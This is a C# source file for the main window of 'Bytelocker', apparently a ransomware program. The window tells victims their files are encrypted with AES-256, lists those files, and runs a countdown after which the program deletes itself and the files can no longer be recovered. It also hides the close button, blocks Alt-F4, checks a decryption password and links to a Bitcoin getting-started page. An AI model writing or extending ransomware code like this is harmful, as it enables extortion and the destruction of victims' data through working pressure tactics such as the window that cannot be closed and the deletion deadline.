using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using Bytelocker.CryptoManager;
using Bytelocker.Settings;
using Bytelocker.Tools;

namespace Bytelocker.UI
{
    public partial class MainWindow : Form
    {
        private const int MAX_FILE_SIZE_LENGHT_UI = 80;

        public static string current_decrypt_file = "null";
        private string current_decrypt_file_local = "null";

        private readonly LinkLabel llAESInfo;
        private readonly LinkLabel llListOfInfectedFiles;
        private PasswordManager pm;

        private int progress_bar_inc;
        private readonly RegistryManager rm;
        private readonly TimeManager tm;

        public MainWindow()
        {
            InitializeComponent();
            MaximizeBox = false;
            tm = new TimeManager();
            rm = new RegistryManager();
            tm.ReadFromRegistry();
            llAESInfo = new LinkLabel();
            llListOfInfectedFiles = new LinkLabel();
            llListOfInfectedFiles.LinkClicked += On_llListOfInfectedFiles_Click;
            llAESInfo.LinkClicked += On_llAESInfo_Click;
        }

        // remove x button
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ClassStyle = cp.ClassStyle | 0x200;
                return cp;
            }
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            MainWindowScreenOne();
        }

        private void MainWindowScreenOne()
        {
            lbCurrentFileDecrypt.Hide();
            pbDecryptProgress.Hide();
            BtnVerify.Hide();
            tbPassInput.Hide();
            rtfInfo.Clear();
            UpdateTime();

            llAESInfo.Show();
            llListOfInfectedFiles.Show();
            lbTitle.Show();

            // rtf box
            rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted." + "\n\n");

            llListOfInfectedFiles.Text = "Here";
            llListOfInfectedFiles.AutoSize = true;
            llListOfInfectedFiles.Location = rtfInfo.GetPositionFromCharIndex(rtfInfo.TextLength);
            rtfInfo.Controls.Add(llListOfInfectedFiles);
            rtfInfo.AppendText(llListOfInfectedFiles.Text);
            rtfInfo.AppendText(new string(' ', 3));
            rtfInfo.SelectionStart = rtfInfo.TextLength;

            rtfInfo.AppendText("is a complete list of encrypted files, you can verify this manually." + "\n\n" +
                               "Encryption was produced" +
                               " using");

            llAESInfo.Text = "AES-256";
            llAESInfo.AutoSize = true;
            llAESInfo.Location = rtfInfo.GetPositionFromCharIndex(rtfInfo.TextLength);
            rtfInfo.Controls.Add(llAESInfo);
            rtfInfo.AppendText(llAESInfo.Text);
            rtfInfo.AppendText(new string(' ', 3));
            rtfInfo.SelectionStart = rtfInfo.TextLength;

            rtfInfo.AppendText(
                "in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." +
                "\n\n");

            rtfInfo.AppendText(
                "NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
            // end rtf box
        }

        private void BtnNext_Click(object sender, EventArgs e)
        {
            rtfInfo.Clear();
            llAESInfo.Hide();
            llListOfInfectedFiles.Hide();

            lbTitle.Hide();
            tbPassInput.Show();
            btnNext.Hide();
            BtnVerify.Show();

            rtfInfo.AppendText("Enter password to unlock, then click 'Verify' to begin decryption.");
            rtfInfo.Select(rtfInfo.GetFirstCharIndexFromLine(0), rtfInfo.Lines[0].Length);
            rtfInfo.SelectionBullet = true;
            rtfInfo.DeselectAll();
        }

        private void BtnVerify_Click(object sender, EventArgs e)
        {
            pm = new PasswordManager();
            pm.FetchPassword();
            if (!(tbPassInput.Text == pm.returnPassword()))
            {
                MessageBox.Show("Invalid Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                tmTimeLeftRefresher.Stop();
                BtnVerify.Hide();

                lbTimeLeft.Text = "";
                rtfInfo.Clear();
                tbPassInput.Hide();
                lbTitleTime.Hide();
                lbTitle.Text = "Decrypting . . .";
                lbTitle.Show();
                lbCurrentFileDecrypt.Show();
                pbDecryptProgress.Show();

                progress_bar_inc = pbDecryptProgress.Maximum / rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;

                tmTimerDecrypt.Start();

                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;
                    Bytelocker.Decrypt();
                }).Start();
            }

            pm = null;
        }

        // override alt-f4
        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void On_llAESInfo_Click(object sender, EventArgs e)
        {
            Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
        }

        private void On_llBitcoinInfo_Click(object sender, EventArgs e)
        {
            Process.Start("https://bitcoin.org/en/getting-started");
        }


        private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
        {
            LaunchListOfEncryptedFilesWindow();
        }

        private void UpdateTimeLeftEvent(object sender, EventArgs e)
        {
            UpdateTime();
        }


        private void tmTimerDecrypt_Tick(object sender, EventArgs e)
        {
            if (!(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
            {
                if (!(current_decrypt_file_local == current_decrypt_file))
                {
                    current_decrypt_file_local = current_decrypt_file;

                    if (current_decrypt_file.Length > MAX_FILE_SIZE_LENGHT_UI)
                        lbCurrentFileDecrypt.Text =
                            TruncateFilePath.ShrinkPath(current_decrypt_file, MAX_FILE_SIZE_LENGHT_UI);
                    else
                        lbCurrentFileDecrypt.Text = current_decrypt_file;

                    pbDecryptProgress.Increment(progress_bar_inc);
                }
            }
            else
            {
                tmTimerDecrypt.Stop();
                pbDecryptProgress.Value = pbDecryptProgress.Maximum;
                MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                Visible = false;
                Bytelocker.Uninstall();
            }
        }

        private void UpdateTime()
        {
            var timeLeftSeconds = (int) tm.DetermineRemainingTimeInSeconds();

            if (timeLeftSeconds < 0)
            {
                tmTimeLeftRefresher.Stop();
                lbTimeLeft.Text = "00:00:00:00";

                // if time is 0, uninstall program
                Visible = false;
                Bytelocker.Uninstall();
            }
            else
            {
                lbTimeLeft.Text = TimeSpan.FromSeconds(timeLeftSeconds).ToString(@"dd\:hh\:mm\:ss");
            }
        }

        private void LaunchListOfEncryptedFilesWindow()
        {
            var efl = new EncryptedFilesList();
            efl.ShowDialog();
        }
    }
}